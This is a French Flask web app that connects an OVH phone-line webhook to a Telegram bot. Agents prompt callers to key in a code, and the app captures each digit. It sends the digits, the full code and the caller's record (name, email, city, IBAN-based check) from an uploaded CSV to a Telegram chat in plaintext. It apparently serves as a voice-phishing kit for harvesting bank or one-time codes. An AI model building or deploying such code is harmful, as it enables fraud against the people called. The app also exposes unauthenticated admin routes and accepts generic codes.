from flask import Flask, request, jsonify, render_template_string, redirect
import os
import json
import requests
import csv
import io
import time
import re
from datetime import datetime
from werkzeug.utils import secure_filename
from urllib.parse import urlencode
from functools import wraps
import logging

# Configuration logging simple
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = 'webhook-key-v3'

# ===================================================================
# CONFIGURATION SIMPLE
# ===================================================================

class Config:
    TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
    CHAT_ID = os.environ.get('CHAT_ID')
    OVH_LINE_NUMBER = os.environ.get('OVH_LINE_NUMBER', '0033185093039')

class DTMFConfig:
    TIMEOUT = int(os.environ.get('DTMF_TIMEOUT', '30'))
    DIGITS_EXPECTED = int(os.environ.get('DTMF_DIGITS_EXPECTED', '4'))
    ENABLE_VALIDATION = os.environ.get('DTMF_ENABLE_VALIDATION', 'true').lower() == 'true'

def check_config():
    missing = []
    if not Config.TELEGRAM_TOKEN: missing.append('TELEGRAM_TOKEN')
    if not Config.CHAT_ID: missing.append('CHAT_ID')
    
    if missing:
        logger.error(f"❌ Variables manquantes: {missing}")
        return False, missing
    
    logger.info("✅ Configuration OK")
    return True, []

# ===================================================================
# GESTIONNAIRE DTMF SIMPLIFIÉ
# ===================================================================

class DTMFManager:
    def __init__(self):
        self.sessions = {}  # caller: {digits, timestamp, agent, etc}
        self.calls = {}     # caller: {start_time, agent}
    
    def register_call(self, caller):
        self.calls[caller] = {
            'start_time': time.time(),
            'status': 'active'
        }
        logger.info(f"📞 Appel: {caller}")
    
    def request_dtmf(self, caller, agent="Agent"):
        if caller not in self.calls:
            self.register_call(caller)
        
        self.sessions[caller] = {
            'digits': '',
            'timestamp': time.time(),
            'status': 'waiting',
            'agent': agent
        }
        
        logger.info(f"🔢 DTMF demandé pour {caller}")
        
        if telegram_service:
            self.notify_dtmf_request(caller, agent)
        return True
    
    def notify_dtmf_request(self, caller, agent):
        client_info = get_client_info(caller)
        message = f"""
🔢 <b>DEMANDE CODE CLIENT</b>

👨‍💼 Agent: <b>{agent}</b>
📞 Client: <code>{caller}</code>
👤 Nom: <b>{client_info['nom']} {client_info['prenom']}</b>

⏳ <b>EN ATTENTE {DTMFConfig.DIGITS_EXPECTED} CHIFFRES...</b>
💡 Client peut taper son code maintenant
        """
        telegram_service.send_message(message)
    
    def add_digit(self, caller, digit):
        if caller not in self.sessions:
            logger.warning(f"🔢 DTMF ignoré pour {caller} (pas de session)")
            return False
        
        session = self.sessions[caller]
        if session['status'] != 'waiting':
            return False
        
        # Vérifier timeout
        if time.time() - session['timestamp'] > DTMFConfig.TIMEOUT:
            session['status'] = 'expired'
            logger.warning(f"🕐 Session expirée: {caller}")
            return False
        
        session['digits'] += digit
        session['timestamp'] = time.time()
        
        logger.info(f"🔢 DTMF: {caller} → {digit} (total: {session['digits']})")
        
        # Progression
        if telegram_service:
            remaining = DTMFConfig.DIGITS_EXPECTED - len(session['digits'])
            progress = "🟢" * len(session['digits']) + "⚪" * remaining
            
            message = f"""
🔢 <b>CODE EN COURS</b>
📞 {caller}: <b>{digit}</b>
📊 {progress} ({len(session['digits'])}/{DTMFConfig.DIGITS_EXPECTED})
            """
            telegram_service.send_message(message)
        
        # Code complet ?
        if len(session['digits']) >= DTMFConfig.DIGITS_EXPECTED:
            session['status'] = 'complete'
            self.process_complete_code(caller, session['digits'])
            return True
        
        return False
    
    def process_complete_code(self, caller, code):
        session = self.sessions[caller]
        agent = session.get('agent', 'Agent')
        
        logger.info(f"✅ Code complet: {caller} → {code}")
        
        # Validation simple
        if DTMFConfig.ENABLE_VALIDATION:
            validation = self.validate_code(caller, code)
        else:
            validation = {"valid": True, "message": "Validation désactivée"}
        
        client_info = get_client_info(caller)
        
        # Résultat final
        if telegram_service:
            status_emoji = "✅" if validation["valid"] else "❌"
            message = f"""
{status_emoji} <b>CODE CLIENT REÇU</b>

👨‍💼 Agent: <b>{agent}</b>
📞 Numéro: <code>{caller}</code>
🔢 Code: <code>{code}</code>
✅ Validation: <b>{validation["message"]}</b>

👤 <b>CLIENT</b>
▪️ Nom: <b>{client_info['nom']} {client_info['prenom']}</b>
▪️ Statut: <b>{client_info['statut']}</b>
▪️ Entreprise: {client_info['entreprise']}
▪️ Email: {client_info['email']}
▪️ Ville: {client_info['ville']}

💼 <b>SUITE:</b> {'🎯 Continuer entretien' if validation["valid"] else '⚠️ Vérifier identité'}
            """
            telegram_service.send_message(message)
        
        # Nettoyer
        del self.sessions[caller]
    
    def validate_code(self, caller, code):
        client_info = get_client_info(caller)
        
        if client_info['statut'] == "Non référencé":
            return {"valid": False, "message": "❌ Client non référencé"}
        
        # Validation par téléphone (4 derniers chiffres)
        phone_digits = re.sub(r'[^\d]', '', caller)
        if len(phone_digits) >= 4 and code == phone_digits[-4:]:
            return {"valid": True, "message": "✅ Code téléphone OK"}
        
        # Validation par IBAN
        if client_info.get('iban'):
            iban_digits = re.sub(r'[^\d]', '', client_info['iban'])
            if len(iban_digits) >= 4 and code == iban_digits[-4:]:
                return {"valid": True, "message": "✅ Code IBAN OK"}
        
        # Codes génériques
        if code in ['1234', '0000', '9999']:
            return {"valid": True, "message": "✅ Code générique OK"}
        
        return {"valid": False, "message": "❌ Code incorrect"}
    
    def end_call(self, caller):
        if caller in self.calls:
            del self.calls[caller]
        if caller in self.sessions:
            del self.sessions[caller]
        logger.info(f"📞 Fin d'appel: {caller}")
    
    def get_active_calls(self):
        return self.calls
    
    def get_active_dtmf(self):
        return self.sessions

dtmf_manager = DTMFManager()

# ===================================================================
# SERVICE TELEGRAM SIMPLIFIÉ
# ===================================================================

class TelegramService:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
    
    def send_message(self, message):
        if not self.token or not self.chat_id:
            logger.error("❌ Telegram non configuré")
            return None
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=5)
            
            if response.status_code == 200:
                logger.info("✅ Message Telegram envoyé")
                return response.json()
            else:
                logger.error(f"❌ Erreur Telegram: {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"❌ Erreur Telegram: {str(e)}")
            return None
    
    def format_client_message(self, client_info):
        return f"""
📞 <b>APPEL ENTRANT</b>

📞 Numéro: <code>{client_info['telephone']}</code>
🕐 Heure: {datetime.now().strftime("%H:%M:%S")}

👤 <b>CLIENT</b>
▪️ Nom: <b>{client_info['nom']} {client_info['prenom']}</b>
▪️ Statut: <b>{client_info['statut']}</b>
▪️ Entreprise: {client_info['entreprise']}
▪️ Email: {client_info['email']}
▪️ Ville: {client_info['ville']}

💡 <i>Commande: /dtmf-request {client_info['telephone']}</i>
        """

# Initialiser Telegram
telegram_service = None
config_valid = False

def init_telegram():
    global telegram_service, config_valid
    is_valid, missing = check_config()
    config_valid = is_valid
    
    if is_valid:
        telegram_service = TelegramService(Config.TELEGRAM_TOKEN, Config.CHAT_ID)
        logger.info("✅ Telegram initialisé")
    else:
        logger.error(f"❌ Variables manquantes: {missing}")

init_telegram()

# ===================================================================
# GESTION CLIENTS SIMPLIFIÉE
# ===================================================================

clients_database = {}
upload_stats = {"total_clients": 0, "last_upload": None}

def normalize_phone(phone):
    if not phone:
        return None
    
    cleaned = re.sub(r'[^\d+]', '', str(phone))
    
    # Patterns simples
    if cleaned.startswith('0033'):
        return '0' + cleaned[4:]
    elif cleaned.startswith('+33'):
        return '0' + cleaned[3:]
    elif cleaned.startswith('33') and len(cleaned) == 11:
        return '0' + cleaned[2:]
    elif cleaned.startswith('0') and len(cleaned) == 10:
        return cleaned
    elif len(cleaned) == 9:
        return '0' + cleaned
    
    return None

def get_client_info(phone_number):
    if not phone_number:
        return create_unknown_client(phone_number)
    
    # Recherche directe
    normalized = normalize_phone(phone_number)
    if normalized and normalized in clients_database:
        client = clients_database[normalized].copy()
        clients_database[normalized]["nb_appels"] += 1
        clients_database[normalized]["dernier_appel"] = datetime.now().strftime("%H:%M:%S")
        return client
    
    # Recherche par suffixe
    cleaned = re.sub(r'[^\d]', '', phone_number)
    if len(cleaned) >= 9:
        suffix = cleaned[-9:]
        for tel, client in clients_database.items():
            if tel.endswith(suffix):
                client_copy = client.copy()
                clients_database[tel]["nb_appels"] += 1
                clients_database[tel]["dernier_appel"] = datetime.now().strftime("%H:%M:%S")
                return client_copy
    
    return create_unknown_client(phone_number)

def create_unknown_client(phone_number):
    return {
        "nom": "INCONNU",
        "prenom": "CLIENT",
        "email": "N/A",
        "entreprise": "N/A",
        "telephone": phone_number,
        "ville": "N/A",
        "iban": "N/A",
        "statut": "Non référencé",
        "nb_appels": 0,
        "dernier_appel": None
    }

def load_clients_from_csv(file_content):
    global clients_database, upload_stats
    clients_database = {}
    
    try:
        csv_reader = csv.DictReader(io.StringIO(file_content))
        
        for row in csv_reader:
            # Normaliser les clés
            normalized_row = {}
            for key, value in row.items():
                if key:
                    normalized_row[key.lower().strip()] = str(value).strip() if value else ""
            
            # Trouver le téléphone
            telephone = None
            for tel_key in ['telephone', 'tel', 'phone', 'numero']:
                if tel_key in normalized_row and normalized_row[tel_key]:
                    telephone = normalize_phone(normalized_row[tel_key])
                    break
            
            if not telephone:
                continue
            
            clients_database[telephone] = {
                "nom": normalized_row.get('nom', ''),
                "prenom": normalized_row.get('prenom', ''),
                "email": normalized_row.get('email', ''),
                "entreprise": normalized_row.get('entreprise', ''),
                "telephone": telephone,
                "ville": normalized_row.get('ville', ''),
                "iban": normalized_row.get('iban', ''),
                "statut": normalized_row.get('statut', 'Prospect'),
                "nb_appels": 0,
                "dernier_appel": None
            }
        
        upload_stats["total_clients"] = len(clients_database)
        upload_stats["last_upload"] = datetime.now().strftime("%H:%M:%S")
        
        logger.info(f"📁 {len(clients_database)} clients chargés")
        return len(clients_database)
        
    except Exception as e:
        logger.error(f"Erreur CSV: {str(e)}")
        raise ValueError(f"Erreur CSV: {str(e)}")

# ===================================================================
# TRAITEMENT COMMANDES TELEGRAM
# ===================================================================

def process_telegram_command(message_text, chat_id):
    if not telegram_service:
        return {"error": "Telegram non configuré"}
    
    try:
        # Demande DTMF
        if message_text.startswith('/dtmf-request '):
            phone = message_text.replace('/dtmf-request ', '').strip().split()[0]
            agent = "Agent"
            
            if dtmf_manager.request_dtmf(phone, agent):
                return {"status": "dtmf_requested", "phone": phone}
            else:
                return {"error": "Impossible de démarrer DTMF"}
        
        # Appels actifs
        elif message_text.startswith('/calls'):
            active_calls = dtmf_manager.get_active_calls()
            active_dtmf = dtmf_manager.get_active_dtmf()
            
            message = f"""
📞 <b>APPELS ACTIFS</b>

👥 Appels: {len(active_calls)}
🔢 DTMF: {len(active_dtmf)}

💡 <code>/dtmf-request NUMERO</code> pour demander code
            """
            telegram_service.send_message(message)
            return {"status": "calls_sent"}
        
        # Fiche client
        elif message_text.startswith('/numero '):
            phone = message_text.replace('/numero ', '').strip()
            client_info = get_client_info(phone)
            message = telegram_service.format_client_message(client_info)
            telegram_service.send_message(message)
            return {"status": "numero_sent", "phone": phone}
        
        # Stats
        elif message_text.startswith('/stats'):
            message = f"""
📊 <b>STATISTIQUES</b>

👥 Clients: {upload_stats['total_clients']}
📞 Ligne: {Config.OVH_LINE_NUMBER}
📁 Upload: {upload_stats['last_upload'] or 'Aucun'}
🔢 DTMF: {DTMFConfig.DIGITS_EXPECTED} chiffres, {DTMFConfig.TIMEOUT}s

📞 Appels actifs: {len(dtmf_manager.get_active_calls())}
🔢 Sessions DTMF: {len(dtmf_manager.get_active_dtmf())}
            """
            telegram_service.send_message(message)
            return {"status": "stats_sent"}
        
        # Help
        elif message_text.startswith('/help'):
            message = """
🤖 <b>COMMANDES</b>

🔢 <code>/dtmf-request 0123456789</code> → Demander code
📞 <code>/calls</code> → Appels actifs  
📋 <code>/numero 0123456789</code> → Fiche client
📊 <code>/stats</code> → Statistiques
🆘 <code>/help</code> → Cette aide

✨ <b>WORKFLOW</b>
1️⃣ Appel → Notification auto
2️⃣ Agent → /dtmf-request NUMERO
3️⃣ Client tape code → Résultat auto
            """
            telegram_service.send_message(message)
            return {"status": "help_sent"}
        
        else:
            return {"status": "unknown_command"}
    
    except Exception as e:
        logger.error(f"Erreur commande: {str(e)}")
        return {"error": str(e)}

# ===================================================================
# ROUTES WEBHOOK
# ===================================================================

@app.route('/webhook/ovh', methods=['POST', 'GET'])
def ovh_webhook():
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if request.method == 'GET':
            caller = request.args.get('caller', 'Inconnu')
            event_type = request.args.get('type', 'unknown')
            dtmf_digit = request.args.get('dtmf', None)
            
            # DTMF reçu
            if dtmf_digit:
                logger.info(f"🔢 DTMF: {caller} → {dtmf_digit}")
                complete = dtmf_manager.add_digit(caller, dtmf_digit)
                
                return jsonify({
                    "status": "dtmf_received",
                    "caller": caller,
                    "digit": dtmf_digit,
                    "complete": complete
                })
            
            # Nouvel appel
            if event_type in ['start_ringing', 'answer', 'incoming']:
                dtmf_manager.register_call(caller)
                client_info = get_client_info(caller)
                
                if telegram_service:
                    message = telegram_service.format_client_message(client_info)
                    telegram_service.send_message(message)
                
                return jsonify({
                    "status": "call_received",
                    "caller": caller,
                    "client_found": client_info['statut'] != "Non référencé"
                })
            
            # Fin d'appel
            elif event_type in ['hangup', 'end']:
                dtmf_manager.end_call(caller)
                return jsonify({"status": "call_ended", "caller": caller})
        
        else:
            # POST
            data = request.get_json() or {}
            caller = data.get('callerIdNumber', 'Inconnu')
            dtmf_digit = data.get('dtmf', None)
            
            if dtmf_digit:
                complete = dtmf_manager.add_digit(caller, dtmf_digit)
                return jsonify({
                    "status": "dtmf_received",
                    "caller": caller,
                    "digit": dtmf_digit,
                    "complete": complete
                })
            
            # Autre traitement POST
            dtmf_manager.register_call(caller)
            client_info = get_client_info(caller)
            
            if telegram_service:
                message = telegram_service.format_client_message(client_info)
                telegram_service.send_message(message)
        
        return jsonify({"status": "success", "timestamp": timestamp})
        
    except Exception as e:
        logger.error(f"Erreur webhook: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/webhook/telegram', methods=['POST'])
def telegram_webhook():
    if not config_valid:
        return jsonify({"error": "Configuration manquante"}), 400
    
    try:
        data = request.get_json()
        
        if 'message' in data and 'text' in data['message']:
            message_text = data['message']['text']
            chat_id = data['message']['chat']['id']
            
            result = process_telegram_command(message_text, chat_id)
            
            return jsonify({
                "status": "success",
                "result": result
            })
        
        return jsonify({"status": "no_text"})
        
    except Exception as e:
        logger.error(f"Erreur Telegram webhook: {str(e)}")
        return jsonify({"error": str(e)}), 500

# ===================================================================
# ROUTES PRINCIPALES
# ===================================================================

@app.route('/')
def home():
    active_calls = len(dtmf_manager.get_active_calls())
    active_dtmf = len(dtmf_manager.get_active_dtmf())
    
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>🤖 Webhook OVH-Telegram DTMF</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat { background: #e3f2fd; padding: 15px; border-radius: 8px; text-align: center; }
        .stat.calls { background: #fff3e0; }
        .stat.dtmf { background: #e8f5e8; }
        .btn { background: #2196F3; color: white; padding: 10px 15px; border: none; border-radius: 5px; margin: 5px; text-decoration: none; display: inline-block; }
        .btn:hover { background: #1976D2; }
        .btn-success { background: #4CAF50; }
        .btn-warning { background: #ff9800; }
        .config { background: #e1f5fe; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #2196F3; }
        .error { background: #ffebee; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #f44336; }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Webhook OVH-Telegram avec DTMF</h1>
        
        {% if config_valid %}
        <div class="config">
            <strong>✅ CONFIGURATION ACTIVE</strong><br>
            📱 Chat ID: <code>{{ chat_id }}</code><br>
            📞 Ligne: <code>{{ ovh_line }}</code><br>
            🔢 DTMF: {{ dtmf_digits }} chiffres, {{ dtmf_timeout }}s
        </div>
        {% else %}
        <div class="error">
            <strong>❌ CONFIGURATION MANQUANTE</strong><br>
            Ajoutez dans Heroku Config Vars :<br>
            • <code>TELEGRAM_TOKEN</code><br>
            • <code>CHAT_ID</code>
        </div>
        {% endif %}
        
        <div class="stats">
            <div class="stat">
                <h3>👥 Clients</h3>
                <h2>{{ total_clients }}</h2>
            </div>
            <div class="stat calls">
                <h3>📞 Appels</h3>
                <h2>{{ active_calls }}</h2>
            </div>
            <div class="stat dtmf">
                <h3>🔢 DTMF</h3>
                <h2>{{ active_dtmf }}</h2>
            </div>
            <div class="stat">
                <h3>📁 Upload</h3>
                <p>{{ last_upload or 'Aucun' }}</p>
            </div>
        </div>
        
        <h2>📂 Upload CSV</h2>
        <form action="/upload" method="post" enctype="multipart/form-data" style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
            <p><strong>Colonne obligatoire:</strong> <code>telephone</code></p>
            <input type="file" name="file" accept=".csv" required>
            <button type="submit" class="btn btn-success">📁 Charger</button>
        </form>
        
        <h2>🔧 Tests & Admin</h2>
        <div>
            <a href="/dtmf-admin" class="btn btn-success">🔢 Admin DTMF</a>
            <a href="/clients" class="btn">👥 Clients</a>
            <a href="/test-telegram" class="btn">📱 Test Telegram</a>
            <a href="/test-workflow" class="btn btn-warning">🧪 Test DTMF</a>
            <a href="/clear" class="btn" onclick="return confirm('Vider ?')">🗑️ Vider</a>
        </div>
        
        <h2>🔗 Configuration 3CX/OVH</h2>
        <div style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
            <p><strong>URLs à configurer :</strong></p>
            <p><strong>Appels :</strong><br>
            <code>{{ webhook_url }}/webhook/ovh?caller=*CALLING*&callee=*CALLED*&type=*EVENT*</code></p>
            <p><strong>DTMF :</strong><br>
            <code>{{ webhook_url }}/webhook/ovh?caller=*CALLING*&dtmf=*DTMF*</code></p>
        </div>
        
        <h2>📱 Commandes Telegram</h2>
        <ul>
            <li><code>/dtmf-request 0123456789</code> - Demander code client</li>
            <li><code>/calls</code> - Appels actifs et DTMF</li>
            <li><code>/numero 0123456789</code> - Fiche client</li>
            <li><code>/stats</code> - Statistiques</li>
            <li><code>/help</code> - Aide</li>
        </ul>
        
        <div class="config">
            <h3>🔄 Workflow Agent :</h3>
            <ol>
                <li>📞 Appel → Notification auto</li>
                <li>🎤 "Tapez votre code sur le téléphone"</li>
                <li>📱 <code>/dtmf-request NUMERO</code></li>
                <li>🔢 Client tape → Validation auto</li>
                <li>✅ Résultat → Continue entretien</li>
            </ol>
        </div>
    </div>
</body>
</html>
    """,
    config_valid=config_valid,
    chat_id=Config.CHAT_ID,
    ovh_line=Config.OVH_LINE_NUMBER,
    dtmf_digits=DTMFConfig.DIGITS_EXPECTED,
    dtmf_timeout=DTMFConfig.TIMEOUT,
    total_clients=upload_stats["total_clients"],
    active_calls=active_calls,
    active_dtmf=active_dtmf,
    last_upload=upload_stats["last_upload"],
    webhook_url=request.url_root.rstrip('/')
    )

@app.route('/dtmf-admin')
def dtmf_admin():
    active_calls = dtmf_manager.get_active_calls()
    active_dtmf = dtmf_manager.get_active_dtmf()
    
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>🔢 Admin DTMF</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background: #f2f2f2; }
        .btn { background: #007bff; color: white; padding: 5px 10px; border: none; border-radius: 3px; text-decoration: none; margin: 2px; }
        .btn-success { background: #28a745; }
        .btn-danger { background: #dc3545; }
        .stats { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin: 20px 0; }
        .stat { background: #f8f9fa; padding: 15px; border-radius: 5px; text-align: center; }
    </style>
    <script>
        function refreshPage() { location.reload(); }
        setInterval(refreshPage, 10000); // Refresh toutes les 10 secondes
    </script>
</head>
<body>
    <div>
        <h1>🔢 Administration DTMF <button onclick="refreshPage()" class="btn">🔄</button></h1>
        
        <div class="stats">
            <div class="stat">
                <h3>📞 Appels Actifs</h3>
                <h2>{{ active_calls|length }}</h2>
            </div>
            <div class="stat">
                <h3>🔢 Sessions DTMF</h3>
                <h2>{{ active_dtmf|length }}</h2>
            </div>
            <div class="stat">
                <h3>⚙️ Config</h3>
                <p>{{ dtmf_config.digits }} chiffres<br>{{ dtmf_config.timeout }}s</p>
            </div>
        </div>
        
        <h2>📞 Appels en cours</h2>
        <table>
            <tr>
                <th>Numéro</th>
                <th>Durée</th>
                <th>DTMF</th>
                <th>Actions</th>
            </tr>
            {% for caller, call_data in active_calls.items() %}
            <tr>
                <td><strong>{{ caller }}</strong></td>
                <td>{{ (current_time - call_data.start_time)|int }}s</td>
                <td>
                    {% if caller in active_dtmf %}
                    🟢 Actif
                    {% else %}
                    ⚪ Inactif
                    {% endif %}
                </td>
                <td>
                    {% if caller not in active_dtmf %}
                    <a href="/start-dtmf/{{ caller }}" class="btn btn-success">🔢 DTMF</a>
                    {% endif %}
                    <a href="/end-call/{{ caller }}" class="btn btn-danger">📴 Fin</a>
                </td>
            </tr>
            {% endfor %}
            {% if not active_calls %}
            <tr><td colspan="4" style="text-align: center;">Aucun appel actif</td></tr>
            {% endif %}
        </table>
        
        <h2>🔢 Sessions DTMF</h2>
        <table>
            <tr>
                <th>Numéro</th>
                <th>Agent</th>
                <th>Code</th>
                <th>Progression</th>
                <th>Actions</th>
            </tr>
            {% for caller, session in active_dtmf.items() %}
            <tr>
                <td><strong>{{ caller }}</strong></td>
                <td>{{ session.agent }}</td>
                <td><code>{{ session.digits or '(vide)' }}</code></td>
                <td>{{ session.digits|length }}/{{ dtmf_config.digits }}</td>
                <td>
                    <a href="/cancel-dtmf/{{ caller }}" class="btn">❌ Annuler</a>
                </td>
            </tr>
            {% endfor %}
            {% if not active_dtmf %}
            <tr><td colspan="5" style="text-align: center;">Aucune session DTMF</td></tr>
            {% endif %}
        </table>
        
        <div style="margin: 20px 0;">
            <a href="/test-workflow" class="btn btn-success">🧪 Test Workflow</a>
            <a href="/clients" class="btn">👥 Clients</a>
            <a href="/" class="btn">🏠 Accueil</a>
        </div>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
            <h3>💡 Instructions :</h3>
            <ol>
                <li>📞 Appel reçu → Notification Telegram</li>
                <li>🎤 Agent demande code client</li>
                <li>📱 <code>/dtmf-request NUMERO</code> dans Telegram</li>
                <li>🔢 Client tape → Validation auto</li>
            </ol>
        </div>
        
        <p style="text-align: center; color: gray;">🔄 Auto-refresh 10s</p>
    </div>
</body>
</html>
    """,
    active_calls=active_calls,
    active_dtmf=active_dtmf,
    current_time=time.time(),
    dtmf_config={'digits': DTMFConfig.DIGITS_EXPECTED, 'timeout': DTMFConfig.TIMEOUT}
    )

# ===================================================================
# ROUTES UTILITAIRES SIMPLIFIÉES
# ===================================================================

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({"error": "Aucun fichier"}), 400
        
        file = request.files['file']
        if not file.filename.endswith('.csv'):
            return jsonify({"error": "Fichier CSV requis"}), 400
        
        content = file.read().decode('utf-8-sig')
        nb_clients = load_clients_from_csv(content)
        
        return jsonify({
            "status": "success",
            "message": f"{nb_clients} clients chargés",
            "total": nb_clients
        })
        
    except Exception as e:
        logger.error(f"Erreur upload: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/clients')
def view_clients():
    search = request.args.get('search', '')
    
    if search:
        filtered = {k: v for k, v in clients_database.items() 
                   if search.lower() in f"{v['nom']} {v['prenom']} {v['telephone']}".lower()}
    else:
        filtered = dict(list(clients_database.items())[:50])  # Limiter à 50
    
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>👥 Clients</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th, td { border: 1px solid #ddd; padding: 5px; }
        th { background: #f2f2f2; }
        .btn { background: #2196F3; color: white; padding: 8px 15px; border: none; border-radius: 3px; margin: 5px; text-decoration: none; }
        .search { margin: 20px 0; }
        .search input { padding: 8px; width: 200px; }
    </style>
</head>
<body>
    <h1>👥 Base Clients ({{ total }} total)</h1>
    
    <div class="search">
        <form method="GET">
            <input type="text" name="search" placeholder="Rechercher..." value="{{ search }}">
            <button type="submit" class="btn">🔍</button>
            <a href="/clients" class="btn">🔄 Tout</a>
            <a href="/" class="btn">🏠 Accueil</a>
        </form>
    </div>
    
    <table>
        <tr>
            <th>Téléphone</th>
            <th>Nom</th>
            <th>Prénom</th>
            <th>Entreprise</th>
            <th>Statut</th>
            <th>Appels</th>
            <th>Action</th>
        </tr>
        {% for tel, client in clients %}
        <tr>
            <td><strong>{{ tel }}</strong></td>
            <td>{{ client.nom }}</td>
            <td>{{ client.prenom }}</td>
            <td>{{ client.entreprise }}</td>
            <td>{{ client.statut }}</td>
            <td>{{ client.nb_appels }}</td>
            <td>
                <a href="/start-dtmf/{{ tel }}" style="background: #4caf50; color: white; padding: 2px 6px; border-radius: 3px; text-decoration: none; font-size: 10px;">🔢</a>
            </td>
        </tr>
        {% endfor %}
    </table>
    
    {% if displayed >= 50 %}
    <p style="color: orange;">⚠️ Affichage limité à 50. Utilisez la recherche.</p>
    {% endif %}
</body>
</html>
    """,
    clients=filtered.items(),
    total=upload_stats["total_clients"],
    displayed=len(filtered),
    search=search
    )

@app.route('/start-dtmf/<caller>')
def start_dtmf_route(caller):
    success = dtmf_manager.request_dtmf(caller, "Agent Web")
    if success:
        return jsonify({"status": "dtmf_started", "caller": caller})
    return jsonify({"error": "Erreur"}), 400

@app.route('/end-call/<caller>')
def end_call_route(caller):
    dtmf_manager.end_call(caller)
    return redirect('/dtmf-admin')

@app.route('/cancel-dtmf/<caller>')
def cancel_dtmf_route(caller):
    if caller in dtmf_manager.sessions:
        del dtmf_manager.sessions[caller]
    return redirect('/dtmf-admin')

@app.route('/test-workflow')
def test_workflow():
    test_caller = "0767328146"
    
    # 1. Simuler appel
    dtmf_manager.register_call(test_caller)
    
    # 2. Demander DTMF
    dtmf_manager.request_dtmf(test_caller, "Agent Test")
    
    # 3. Simuler code 1234
    dtmf_manager.add_digit(test_caller, '1')
    time.sleep(0.1)
    dtmf_manager.add_digit(test_caller, '2')
    time.sleep(0.1)
    dtmf_manager.add_digit(test_caller, '3')
    time.sleep(0.1)
    dtmf_manager.add_digit(test_caller, '4')
    
    return jsonify({
        "status": "test_completed",
        "caller": test_caller,
        "code": "1234",
        "messages": "Vérifiez Telegram pour les messages",
        "steps": [
            "✅ Appel simulé",
            "✅ DTMF demandé",
            "✅ Code 1234 saisi",
            "✅ Validation effectuée"
        ]
    })

@app.route('/test-telegram')
def test_telegram():
    if not telegram_service:
        return jsonify({"error": "Telegram non configuré"}), 400
    
    message = f"🧪 Test webhook DTMF - {datetime.now().strftime('%H:%M:%S')}"
    result = telegram_service.send_message(message)
    
    if result:
        return jsonify({"status": "success", "message": "Test envoyé"})
    return jsonify({"status": "error", "message": "Échec test"})

@app.route('/clear')
def clear_all():
    global clients_database, upload_stats
    clients_database = {}
    upload_stats = {"total_clients": 0, "last_upload": None}
    return redirect('/')

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "version": "webhook-dtmf-optimized-v1.0",
        "config_valid": config_valid,
        "telegram_configured": telegram_service is not None,
        "active_calls": len(dtmf_manager.get_active_calls()),
        "active_dtmf": len(dtmf_manager.get_active_dtmf()),
        "clients_loaded": upload_stats["total_clients"],
        "timestamp": datetime.now().strftime("%H:%M:%S")
    })

# ===================================================================
# WEBHOOK TELEGRAM - CONFIG
# ===================================================================

@app.route('/fix-webhook')
def fix_webhook():
    if not Config.TELEGRAM_TOKEN:
        return jsonify({"error": "Token manquant"}), 400
    
    try:
        webhook_url = request.url_root + "webhook/telegram"
        url = f"https://api.telegram.org/bot{Config.TELEGRAM_TOKEN}/setWebhook"
        
        response = requests.post(url, data={"url": webhook_url}, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "status": "success",
                "webhook_url": webhook_url,
                "message": "Webhook configuré"
            })
        else:
            return jsonify({"error": "Erreur config webhook"}), 400
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ===================================================================
# DÉMARRAGE OPTIMISÉ
# ===================================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    logger.info("🚀 Démarrage webhook DTMF optimisé")
    
    # Vérification rapide
    is_valid, missing = check_config()
    
    if is_valid:
        logger.info("✅ Configuration OK")
        logger.info(f"📱 Chat: {Config.CHAT_ID}")
        logger.info(f"📞 Ligne: {Config.OVH_LINE_NUMBER}")
        logger.info(f"🔢 DTMF: {DTMFConfig.DIGITS_EXPECTED} chiffres, {DTMFConfig.TIMEOUT}s")
        
        logger.info("🔗 URLs à configurer :")
        logger.info("   📞 Appels: /webhook/ovh?caller=*CALLING*&type=*EVENT*")
        logger.info("   🔢 DTMF: /webhook/ovh?caller=*CALLING*&dtmf=*DTMF*")
        
    else:
        logger.warning(f"⚠️ Variables manquantes: {missing}")
        logger.warning("🔧 Ajoutez TELEGRAM_TOKEN et CHAT_ID dans Heroku Config Vars")
    
    logger.info(f"🌐 Port: {port}")
    logger.info("🔢 DTMF: Capture à la demande uniquement")
    
